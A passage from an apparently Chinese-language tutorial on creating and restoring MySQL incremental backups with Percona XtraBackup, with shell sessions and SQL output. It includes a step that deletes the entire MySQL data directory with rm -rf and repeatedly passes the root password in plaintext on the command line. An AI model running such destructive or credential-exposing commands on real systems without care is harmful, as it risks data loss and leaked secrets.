percona-version-check</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/</span><br><span class="line">2022-04-24_21-23-58</span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x63D2;&#x5165;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x5230;&#x8868;&#x91CC;&#x9762;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 7</span><br><span class="line">Server version: 5.7.20 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> TESTDB;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">use</span> TESTDB;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> TABLE1 (bTypeId <span class="built_in">int</span>,bName <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,publishing <span class="built_in">char</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;1&apos;</span>,<span class="string">&apos;Linux&apos;</span>,<span class="string">&apos;66&apos;</span>,<span class="string">&apos;DZ&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;2&apos;</span>,<span class="string">&apos;CLD&apos;</span>,<span class="string">&apos;68&apos;</span>,<span class="string">&apos;RM&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;3&apos;</span>,<span class="string">&apos;SYS&apos;</span>,<span class="string">&apos;90&apos;</span>,<span class="string">&apos;JX&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;4&apos;</span>,<span class="string">&apos;MySQL1&apos;</span>,<span class="string">&apos;71&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;5&apos;</span>,<span class="string">&apos;MySQL2&apos;</span>,<span class="string">&apos;72&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;6&apos;</span>,<span class="string">&apos;MySQL3&apos;</span>,<span class="string">&apos;73&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;7&apos;</span>,<span class="string">&apos;MySQL4&apos;</span>,<span class="string">&apos;74&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;8&apos;</span>,<span class="string">&apos;MySQL5&apos;</span>,<span class="string">&apos;75&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;9&apos;</span>,<span class="string">&apos;MySQL6&apos;</span>,<span class="string">&apos;76&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;10&apos;</span>,<span class="string">&apos;MySQL7&apos;</span>,<span class="string">&apos;77&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;11&apos;</span>,<span class="string">&apos;MySQL8&apos;</span>,<span class="string">&apos;78&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;12&apos;</span>,<span class="string">&apos;MySQL9&apos;</span>,<span class="string">&apos;79&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> TABLE2 (<span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,pages <span class="built_in">int</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;Linux&apos;</span>,<span class="string">&apos;30&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;CLD&apos;</span>,<span class="string">&apos;60&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;SYS&apos;</span>,<span class="string">&apos;80&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> TABLE2(<span class="keyword">name</span>,price,pages) <span class="keyword">VALUES</span>(<span class="string">&apos;MySQL1&apos;</span>,<span class="string">&apos;166&apos;</span>,<span class="string">&apos;666&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> TABLE2;</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| Tables_in_TESTDB |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| TABLE1           |</span><br><span class="line">| TABLE2           |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE1;</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">| bTypeId | bName  | price | publishing |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">|       1 | Linux  |    66 | DZ         |</span><br><span class="line">|       2 | CLD    |    68 | RM         |</span><br><span class="line">|       3 | SYS    |    90 | JX         |</span><br><span class="line">|       4 | MySQL1 |    71 | QH         |</span><br><span class="line">|       5 | MySQL2 |    72 | QH         |</span><br><span class="line">|       6 | MySQL3 |    73 | QH         |</span><br><span class="line">|       7 | MySQL4 |    74 | QH         |</span><br><span class="line">|       8 | MySQL5 |    75 | QH         |</span><br><span class="line">|       9 | MySQL6 |    76 | QH         |</span><br><span class="line">|      10 | MySQL7 |    77 | QH         |</span><br><span class="line">|      11 | MySQL8 |    78 | QH         |</span><br><span class="line">|      12 | MySQL9 |    79 | QH         |</span><br><span class="line">+<span class="comment">---------+--------+-------+------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> TABLE2;</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| name   | price | pages |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">| Linux  |    30 |   666 |</span><br><span class="line">| CLD    |    60 |   666 |</span><br><span class="line">| SYS    |    80 |   666 |</span><br><span class="line">| MySQL1 |   166 |   666 |</span><br><span class="line">+<span class="comment">--------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| TESTDB             |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">7 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>&#x4F7F;&#x7528; &#x2013;incremental&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">innobackupex --user=root --password=Jaking@vip.163.com --incremental /&#x589E;&#x91CF;1&#x8DEF;&#x5F84; --incremental-basedir=&#x5168;&#x5907;&#x8DEF;&#x5F84;&#xFF0C;&#x6307;&#x5B9A;&#x5728;&#x54EA;&#x4E2A;&#x5168;&#x5907;&#x4E0A;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/</span><br><span class="line">2021-05-14_08-33-57</span><br><span class="line">[root@jaking ~]#&#xA0;innobackupex --user=root --password=Jaking@vip.163.com --incremental /tmp/db_backup/ --incremental-basedir=/tmp/db_backup/2022-04-24_21-23-58/</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/</span><br><span class="line">2022-04-24_21-23-58  2022-04-24_21-31-38</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58/</span><br><span class="line">backup-my.cnf   mysql               xtrabackup_checkpoints</span><br><span class="line">BOOK            performance_schema  xtrabackup_info</span><br><span class="line">ib_buffer_pool  sys                 xtrabackup_logfile</span><br><span class="line">ibdata1         testbookdb</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-31-38/</span><br><span class="line">backup-my.cnf   mysql               xtrabackup_checkpoints</span><br><span class="line">BOOK            performance_schema  xtrabackup_info</span><br><span class="line">ib_buffer_pool  sys                 xtrabackup_logfile</span><br><span class="line">ibdata1.delta   testbookdb</span><br><span class="line">ibdata1.meta    TESTDB</span><br><span class="line">[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-23-58/</span><br><span class="line">26M     /tmp/db_backup/2022-04-24_21-23-58/</span><br><span class="line">[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-31-38/ </span><br><span class="line">5.1M    /tmp/db_backup/2022-04-24_21-31-38/</span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x518D;&#x67E5;&#x770B;LSN&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;<br>[root@jaking ~]# cat /tmp/db_backup/2022-04-24_21-23-58/xtrabackup_checkpoints<br>backup_type = full-backuped<br>from_lsn = 0<br>to_lsn = 2566100<br>last_lsn = 2566109<br>compact = 0<br>recover_binlog_info = 0<br>flushed_lsn = 2566109</p><p>[root@jaking ~]# cat /tmp/db_backup/2022-04-24_21-31-38/xtrabackup_checkpoints<br>backup_type = incremental<br>from_lsn = 2566100<br>to_lsn = 2588592<br>last_lsn = 2588601<br>compact = 0<br>recover_binlog_info = 0<br>flushed_lsn = 2588601</p><ol start="3"><li>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x521B;&#x5EFA;&#x7684;&#x66FF;&#x4EE3;&#x65B9;&#x6CD5;<br>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6307;&#x5B9A; &#x2013;incremental-lsn&#x6765;&#x4EE3; &#x2013;incremental-basedir&#x7684;&#x65B9;&#x6CD5;&#x521B;&#x5EFA;&#x589E;&#x91CF;&#x5907;&#x4EFD;<br>innobackupex &#x2013;user=root <a href="mailto:--password=Jaking@vip.163.com" target="_blank" rel="noopener">--password=Jaking@vip.163.com</a> &#x2013;incremental /tmp/db_backup/ &#x2013;incremental-lsn=&lt;&#x65E5;&#x5FD7;&#x5E8F;&#x5217;&#x53F7;&gt;  #&#x4ECE;&#x8FD9;&#x4E2A;&#x7F16;&#x53F7;&#x70B9;&#x5F00;&#x59CB;&#x5907;&#x4EFD;<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# ls /tmp/db_backup/</span><br><span class="line">2022-04-24_21-23-58  2022-04-24_21-31-38</span><br><span class="line">[root@jaking ~]# innobackupex --user=root --password=Jaking@vip.163.com --incremental /tmp/db_backup/ --incremental-lsn=2566109</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/</span><br><span class="line">2022-04-24_21-23-58  2022-04-24_21-31-38  2022-04-24_21-41-49</span><br><span class="line">[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-23-58</span><br><span class="line">26M     /tmp/db_backup/2022-04-24_21-23-58</span><br><span class="line">[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-31-38</span><br><span class="line">5.1M    /tmp/db_backup/2022-04-24_21-31-38</span><br><span class="line">[root@jaking ~]# du -sh /tmp/db_backup/2022-04-24_21-41-49</span><br><span class="line">5.1M    /tmp/db_backup/2022-04-24_21-41-49</span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x6CE8;&#x610F;&#xFF1A;xtrabackup&#x53EA;&#x4F1A;&#x5F71;&#x54CD;xtradb&#x6216;&#x8005;innodb&#x7684;&#x8868;&#xFF0C;&#x5176;&#x4ED6;&#x5F15;&#x64CE;&#x7684;&#x8868;&#x5728;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x65F6;&#x5019;&#x53EA;&#x4F1A;&#x590D;&#x5236;&#x6574;&#x4E2A;&#x6587;&#x4EF6;</p><p>&#x8FD8;&#x539F;</p><p>&#x505C;&#x6B62;MySQL&#x670D;&#x52A1;,&#x5220;&#x9664;&#x6570;&#x636E; rm -rf /var/lib/mysql/* </p><p>&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x5907;&#x4EFD;<br>&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x6062;&#x590D;&#x6BD4;&#x5168;&#x5907;&#x8981;&#x590D;&#x6742;&#x4E00;&#x70B9;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#x662F;&#x5728;&#x6240;&#x6709;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E0B;&#x91CD;&#x505A;&#x5DF2;&#x63D0;&#x4EA4;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x5982;&#xFF1A;<br>innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR  </p><p>innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-1<br>innobackupex &#x2013;apply-log &#x2013;redo-only BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-2<br>&#x2026;<br>&#x2026;<br>&#x2026;<br>innobackupex &#x2013;apply-log BASE-DIR &#x2013;incremental-dir=INCREMENTAL-DIR-last-num</p><p>&#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x4EC5;&#x6709;&#x4E00;&#x4EFD;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;&#x7B2C;3&#x6761;&#x8BED;&#x53E5;&#x5FFD;&#x7565;<br>&#x5176;&#x4E2D;BASE-DIR&#x662F;&#x6307;&#x5168;&#x5907;&#x76EE;&#x5F55;&#xFF0C;INCREMENTAL-DIR-1&#x662F;&#x6307;&#x7B2C;&#x4E00;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;INCREMENTAL-DIR-2&#x662F;&#x6307;&#x7B2C;&#x4E8C;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;&#x4EE5;&#x6B64;&#x7C7B;&#x63A8;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5E76;&#x6CA1;&#x6709;&#x2013;redo-only&#x9009;&#x9879;&#xFF01;</p><p>&#x4EE5;&#x4E0A;&#x8BED;&#x53E5;&#x6267;&#x884C;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x5728;BASE-DIR&#xFF08;&#x5373;&#x5168;&#x5907;&#x76EE;&#x5F55;&#xFF09;&#x4E0B;</p><p>&#x7B2C;&#x4E00;&#x6B65;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x7B2C;&#x4E8C;&#x6B65;&#xFF1A;&#x56DE;&#x6EDA;&#x672A;&#x5B8C;&#x6210;&#x7684;&#x65E5;&#x5FD7;&#xFF1A;<br>innobackupex &#x2013;apply-log BASE-DIR</p><p>&#x4E0A;&#x9762;&#x6267;&#x884C;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;BASE-DIR&#x91CC;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5DF2;&#x5B8C;&#x5168;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x662F;&#x62F7;&#x8D1D;&#xFF1A;<br>innobackupex &#x2013;copy-back BASE-DIR</p><p>&#x6062;&#x590D;mysql&#x6743;&#x9650; chown -Rf mysql:mysql /var/lib/mysql/</p><p>&#x6700;&#x540E;&#x542F;&#x52A8; systemctl start mysqld </p><p>&#x68C0;&#x9A8C;&#x6570;&#x636E;&#x662F;&#x5426;&#x6062;&#x590D;&#x6B63;&#x5E38;<br>&#x6CE8;&#x610F;&#xFF1A;innobackupex&#x8FD8;&#x539F;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5BB9;&#x6613;&#x51FA;&#x9519;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#xFF01;</p><p>&#x5B9E;&#x6218;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# ls /var/lib/mysql</span><br><span class="line">auto.cnf        ibdata1      mysql               testbookdb</span><br><span class="line">BOOK            ib_logfile0  performance_schema  TESTDB</span><br><span class="line">ib_buffer_pool  ib_logfile1  sys                 xtrabackup_info</span><br><span class="line">[root@jaking ~]# mkdir /mysql-all-data</span><br><span class="line">[root@jaking ~]# mv /var/lib/mysql/* /mysql-all-data/</span><br><span class="line">[root@jaking ~]# ls /var/lib/mysql                   </span><br><span class="line">[root@jaking ~]# ls /mysql-all-data/</span><br><span class="line">auto.cnf        ibdata1      mysql               testbookdb</span><br><span class="line">BOOK            ib_logfile0  performance_schema  TESTDB</span><br><span class="line">ib_buffer_pool  ib_logfile1  sys                 xtrabackup_info</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/</span><br><span class="line">2022-04-24_21-23-58  2022-04-24_21-31-38  2022-04-24_21-41-49</span><br><span class="line">[root@jaking ~]# rm -rf /tmp/db_backup/2022-04-24_21-41-49</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/                       </span><br><span class="line">2022-04-24_21-23-58  2022-04-24_21-31-38</span><br><span class="line">[root@jaking ~]# innobackupex --apply-log --redo-only /tmp/db_backup/2022-04-24_21-23-58</span><br><span class="line">[root@jaking ~]# innobackupex --apply-log /tmp/db_backup/2022-04-24_21-23-58 --incremental-dir=/tmp/db_backup/2022-04-24_21-31-38</span><br><span class="line">fnaich:&#xFF01;&#x589E;&#x91CF;&#x5408;&#x5E76;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x5426;&#x5219;&#x62A5;&#x9519;</span><br><span class="line">[root@jaking ~]# ls /tmp/db_backup/2022-04-24_21-23-58/</span><br><span class="line">backup-my.cnf   ib_logfile0  performance_schema  xtrabackup_checkpoints</span><br><span class="line">BOOK            ib_logfile1  sys                 xtrabackup_info</span><br><span class="line">ib_buffer_pool  ibtmp1       testbookdb          xtrabackup_logfile</span><br><span class="line">ibdata1         mysql        TESTDB              xtrabackup_master_key_id</span><br><span class="line">[root@jaking ~]# innobackupex --apply-log /tmp/db_backup/2022-04-24_21-23-58/</span><br><span class="line">[root@jaking ~]# innobackupex --copy-back /tmp/db_backup/2022-04-24_21-23-58/</span><br><span class="line">[root@jaking ~]# chown -Rf mysql:mysql /var/lib/mysql/</span><br><span class="line">[root@jaking ~]# ll /var/lib/mysql/</span><br><span class="line">total 122920</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 24 21:59 BOOK</span><br><span class="line">-rw-r----- 1 mysql mysql      315 Apr 24 21:59 ib_buffer_pool</span><br><span class="line">-rw-r----- 1 mysql mysql 12582912 Apr 24 21:59 ibdata1</span><br><span class="line">-rw-r----- 1 mysql mysql 50331648 Apr 24 21:59 ib_logfile0</span><br><span class="line">-rw-r----- 1 mysql mysql 50331648 Apr 24 21:59 ib_logfile1</span><br><span class="line">-rw-r----- 1 mysql mysql 12582912 Apr 24 21:59 ibtmp1</span><br><span class="line">drwxr-x--- 2 mysql mysql     4096 Apr 24 21:59 mysql</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 24 21:59 performance_schema</span><br><span class="line">drwxr-x--- 2 mysql mysql     8192 Apr 24 21:59 sys</span><br><span class="line">drwxr-x--- 2 mysql mysql       88 Apr 24 21:59 testbookdb</span><br><span class="line">drwxr-x--- 2 mysql mysql       92 Apr 24 21:59 TESTDB</span><br><span class="line">-rw-r----- 1 mysql mysql      504 Apr 24 21:59 xtrabackup_info</span><br><span class="line">-rw-r----- 1 mysql mysql        1 Apr 24 21:59 xtrabackup_master_key_id</span><br><span class="line">[root@jaking ~]# systemctl start mysqld</span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3</span><br><span class="line">Server version: 5.7.20 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 